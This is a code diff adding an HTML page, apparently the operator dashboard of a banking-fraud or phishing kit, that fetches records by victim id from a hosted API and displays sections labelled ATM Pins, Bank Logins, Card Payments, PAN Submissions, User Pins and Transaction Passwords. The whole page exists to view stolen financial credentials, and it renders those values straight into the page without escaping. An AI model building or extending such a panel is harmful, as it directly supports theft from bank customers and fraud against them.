@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>User Data | Devices Live</title>
+
+<style>
+
+body {
+  font-family: 'Roboto', sans-serif;
+  margin: 0;
+  background: #f5f5f5;
+  color: #333;
+}
+
+/* HEADER */
+.header {
+  background:#fff;
+  padding:18px 12px;
+  position: fixed;
+  top:0; left:0; right:0;
+  z-index:1000;
+  box-shadow:0 2px 4px rgba(0,0,0,0.1);
+}
+.header-title {
+  margin:0;
+  font-size:24px;
+  color:#0a7d3c;
+  text-align:center;
+  font-weight:700;
+}
+
+/* Loader */
+#loaderBox {
+  position: fixed; inset: 0;
+  background:#f5f5f5;
+  display:flex; justify-content:center; align-items:center;
+  flex-direction:column; gap:25px;
+  z-index:9999;
+}
+.cube{width:55px;height:55px;transform-style:preserve-3d;animation:cubeRotate 1.8s linear infinite;}
+.cube div{position:absolute;width:55px;height:55px;background:#00a14b;border:2px solid #fff;}
+.cube .front{transform:rotateY(0deg)translateZ(27px);}
+.cube .back{transform:rotateY(180deg)translateZ(27px);}
+.cube .right{transform:rotateY(90deg)translateZ(27px);}
+.cube .left{transform:rotateY(-90deg)translateZ(27px);}
+.cube .top{transform:rotateX(90deg)translateZ(27px);}
+.cube .bottom{transform:rotateX(-90deg)translateZ(27px);}
+@keyframes cubeRotate{0%{transform:rotateX(0)rotateY(0);}100%{transform:rotateX(360deg)rotateY(360deg);}}
+
+/* Main Container */
+.container {
+  max-width:900px;
+  margin:120px auto 40px;
+  padding:0 15px;
+}
+
+/* Each block */
+.data-block {
+  background:#fff;
+  margin-bottom:18px;
+  border-radius:12px;
+  padding:12px 14px;
+  box-shadow:0 2px 5px rgba(0,0,0,0.1);
+  border-left:5px solid #0a7d3c;
+}
+
+.title {
+  font-size:18px;
+  font-weight:700;
+  color:#0a7d3c;
+  margin-bottom:6px;
+}
+
+.item {
+  margin:3px 0;
+  font-size:15px;
+}
+
+.entry-separator {
+  margin:8px 0;
+  border-bottom:1px dashed #ccc;
+}
+
+</style>
+</head>
+
+<body>
+
+<div id="loaderBox">
+  <div class="cube">
+    <div class="front"></div><div class="back"></div>
+    <div class="right"></div><div class="left"></div>
+    <div class="top"></div><div class="bottom"></div>
+  </div>
+  <div class="loading-text">Loading...</div>
+</div>
+
+<header class="header">
+  <h1 class="header-title">User <span style="color:red;">Data</span></h1>
+</header>
+
+<div class="container" id="dataContainer">Loading...</div>
+
+<script>
+
+const uniqueid = new URLSearchParams(window.location.search).get("id");
+const API_URL = `https://rtot-after-crash-1.onrender.com/api/all-data/${uniqueid}`;
+
+// Titles mapping
+const sectionNames = {
+  forms: "Forms",
+  atmPins: "ATM Pins",
+  bankLogins: "Bank Logins",
+  cardPayments: "Card Payments",
+  pan: "PAN Submissions",
+  userPins: "User Pins",
+  transactionPasswords: "Transaction Passwords"
+};
+
+async function loadUserData() {
+
+  const box = document.getElementById("dataContainer");
+
+  try {
+    const res = await fetch(API_URL);
+    const json = await res.json();
+    const data = json.data;
+
+    if (!data) {
+      box.innerHTML = `<div class="data-block"><div class="title">No Data Found</div></div>`;
+      document.getElementById("loaderBox").style.display="none";
+      return;
+    }
+
+    let html = "";
+
+    // Loop all sections
+    Object.entries(data).forEach(([key, value]) => {
+
+      if (!value) return;
+
+      const title = sectionNames[key] || key;
+
+      // CASE 1: Array (multiple entries)
+      if (Array.isArray(value) && value.length > 0) {
+
+        value.forEach((entry, index) => {
+
+          html += `<div class="data-block">`;
+
+          html += `<div class="title">${title} #${index+1}</div>`;
+
+          Object.entries(entry).forEach(([k, v]) => {
+            if(k !== "uniqueid")
+              html += `<div class="item"><b>${k}:</b> ${v}</div>`;
+          });
+
+          html += `</div>`;
+        });
+      }
+
+      // CASE 2: Single object (not array)
+      else if (typeof value === "object") {
+
+        html += `<div class="data-block">`;
+        html += `<div class="title">${title}</div>`;
+
+        Object.entries(value).forEach(([k, v]) => {
+          if(k !== "uniqueid")
+            html += `<div class="item"><b>${k}:</b> ${v}</div>`;
+        });
+
+        html += `</div>`;
+      }
+
+    });
+
+    box.innerHTML = html;
+
+  } catch (err) {
+    console.error(err);
+    box.innerHTML = `<p>Error loading data</p>`;
+  }
+
+  document.getElementById("loaderBox").style.display="none";
+}
+
+loadUserData();
+
+</script>
+
+</body>
+</html>
